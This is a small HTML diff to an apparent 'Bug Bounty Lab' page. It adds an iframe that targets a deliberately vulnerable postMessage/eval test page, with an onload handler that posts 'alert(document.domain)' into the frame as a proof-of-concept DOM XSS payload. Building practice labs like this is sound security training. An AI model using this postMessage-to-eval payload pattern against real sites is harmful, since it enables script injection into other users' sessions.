@@ -9,6 +9,10 @@
  <body>
 
     <h1> Welcome to the Bug Bounty Lab</h1>
+    <button id="sendMessage"></button>
+    <iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" , onload="this.contentWindow.postMessage('alert(document.domain)','*')" >
+
+    </iframe>
     
 
 <script src="main.js"></script>
